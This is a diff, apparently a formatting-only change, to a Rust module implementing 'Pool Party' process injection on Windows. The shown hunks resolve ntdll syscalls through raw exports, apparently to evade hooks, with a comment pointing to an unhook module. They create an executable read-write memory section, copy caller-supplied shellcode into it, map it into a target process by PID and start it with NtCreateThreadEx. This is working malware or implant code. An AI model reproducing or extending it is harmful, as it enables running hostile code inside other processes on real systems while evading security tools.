@@ -79,39 +79,39 @@ pub fn set_pool_party_enabled(on: bool) -> bool {
 // ============================================================================
 
 type NtCreateSectionFn = unsafe extern "system" fn(
-    *mut *mut c_void,    // SectionHandle (out)
-    u32,                 // DesiredAccess
-    *const c_void,       // ObjectAttributes (opt, null)
-    *const i64,          // MaximumSize (opt)
-    u32,                // PageProtection
-    u32,                 // AllocationAttributes
-    *mut c_void,         // FileHandle (opt, null for page-file-backed)
+    *mut *mut c_void, // SectionHandle (out)
+    u32,              // DesiredAccess
+    *const c_void,    // ObjectAttributes (opt, null)
+    *const i64,       // MaximumSize (opt)
+    u32,              // PageProtection
+    u32,              // AllocationAttributes
+    *mut c_void,      // FileHandle (opt, null for page-file-backed)
 ) -> i32;
 
 type NtMapViewOfSectionFn = unsafe extern "system" fn(
-    *mut c_void,         // SectionHandle
-    *mut c_void,         // ProcessHandle
-    *mut *mut c_void,    // BaseAddress (in/out)
-    usize,               // ZeroBits
-    usize,               // CommitSize
-    *mut i64,            // SectionOffset (in/out, PLARGE_INTEGER)
-    *mut usize,          // ViewSize (in/out)
-    u32,                 // InheritDisposition
-    u32,                 // AllocationType
-    u32,                 // Win32Protect
+    *mut c_void,      // SectionHandle
+    *mut c_void,      // ProcessHandle
+    *mut *mut c_void, // BaseAddress (in/out)
+    usize,            // ZeroBits
+    usize,            // CommitSize
+    *mut i64,         // SectionOffset (in/out, PLARGE_INTEGER)
+    *mut usize,       // ViewSize (in/out)
+    u32,              // InheritDisposition
+    u32,              // AllocationType
+    u32,              // Win32Protect
 ) -> i32;
 
 type NtUnmapViewOfSectionFn = unsafe extern "system" fn(
-    *mut c_void,         // ProcessHandle
-    *mut c_void,         // BaseAddress
+    *mut c_void, // ProcessHandle
+    *mut c_void, // BaseAddress
 ) -> i32;
 
 type NtQueryInformationThreadFn = unsafe extern "system" fn(
-    *mut c_void,         // ThreadHandle
-    u32,                 // ThreadInformationClass
-    *mut c_void,         // ThreadInformation (out)
-    u32,                 // ThreadInformationLength
-    *mut u32,            // ReturnLength (opt)
+    *mut c_void, // ThreadHandle
+    u32,         // ThreadInformationClass
+    *mut c_void, // ThreadInformation (out)
+    u32,         // ThreadInformationLength
+    *mut u32,    // ReturnLength (opt)
 ) -> i32;
 
 /// Resolve the four section/TP syscalls via `ntdll` raw exports. Returns
@@ -122,17 +122,18 @@ fn resolve_section_fns() -> Option<(
     NtUnmapViewOfSectionFn,
     NtQueryInformationThreadFn,
 )> {
-    let cs: NtCreateSectionFn = unsafe {
-        core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtCreateSection")?)
-    };
-    let mv: NtMapViewOfSectionFn = unsafe {
-        core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtMapViewOfSection")?)
-    };
+    let cs: NtCreateSectionFn =
+        unsafe { core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtCreateSection")?) };
+    let mv: NtMapViewOfSectionFn =
+        unsafe { core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtMapViewOfSection")?) };
     let uv: NtUnmapViewOfSectionFn = unsafe {
         core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtUnmapViewOfSection")?)
     };
     let qi: NtQueryInformationThreadFn = unsafe {
-        core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtQueryInformationThread")?)
+        core::mem::transmute(resolve::export_addr(
+            b"ntdll.dll",
+            b"NtQueryInformationThread",
+        )?)
     };
     Some((cs, mv, uv, qi))
 }
@@ -217,10 +218,7 @@ pub struct TpWork {
 /// (matching the working pattern in `unhook.rs::fresh_ntdll_text`), which
 /// creates the double-pointer directly from the local's address without an
 /// intermediate `&mut` reference.
-pub unsafe fn pool_party_inject(
-    target_pid: u32,
-    shellcode: &[u8],
-) -> Result<(), String> {
+pub unsafe fn pool_party_inject(target_pid: u32, shellcode: &[u8]) -> Result<(), String> {
     let (create_section, map_view, unmap_view, _query_thread) =
         resolve_section_fns().ok_or_else(|| String::from("ntdll section exports missing"))?;
 
@@ -251,7 +249,7 @@ pub unsafe fn pool_party_inject(
             0x000F001F, // SECTION_ALL_ACCESS
             core::ptr::null(),
             &section_size as *const i64,
-            0x40,       // PAGE_EXECUTE_READWRITE
+            0x40,        // PAGE_EXECUTE_READWRITE
             0x0800_0000, // SEC_COMMIT
             core::ptr::null_mut(),
         )
@@ -287,11 +285,7 @@ pub unsafe fn pool_party_inject(
     // SAFETY: local_base is a fresh RWX view of size local_size; shellcode
     // fits in the rounded-up section.
     unsafe {
-        core::ptr::copy_nonoverlapping(
-            shellcode.as_ptr(),
-            local_base as *mut u8,
-            shellcode.len(),
-        );
+        core::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_base as *mut u8, shellcode.len());
     }
 
     // ---- 5. Map the section into the target process ----
@@ -362,22 +356,42 @@ pub unsafe fn pool_party_inject(
         None => return Err(String::from("NtCreateThreadEx export missing")),
     };
     type NtCTE = unsafe extern "system" fn(
-        *mut *mut c_void, u32, *const c_void, *mut c_void,
-        *const c_void, *const c_void, u32, usize, usize, usize, *const c_void,
+        *mut *mut c_void,
+        u32,
+        *const c_void,
+        *mut c_void,
+        *const c_void,
+        *const c_void,
+        u32,
+        usize,
+        usize,
+        usize,
+        *const c_void,
     ) -> i32;
     let nt_cte: NtCTE = unsafe { core::mem::transmute(ct) };
 
     let mut h_thread: *mut c_void = core::ptr::null_mut();
     let st = unsafe {
         nt_cte(
-            &mut h_thread, 0x1FFFFF, core::ptr::null(), target_h,
-            target_base, core::ptr::null(), 0, 0, 0, 0, core::ptr::null(),
+            &mut h_thread,
+            0x1FFFFF,
+            core::ptr::null(),
+            target_h,
+            target_base,
+            core::ptr::null(),
+            0,
+            0,
+            0,
+            0,
+            core::ptr::null(),
         )
     };
     if st >= 0 {
         Ok(())
     } else {
-        Err(String::from("Pool Party: section delivery OK, NtCreateThreadEx failed"))
+        Err(String::from(
+            "Pool Party: section delivery OK, NtCreateThreadEx failed",
+        ))
     }
 }
 
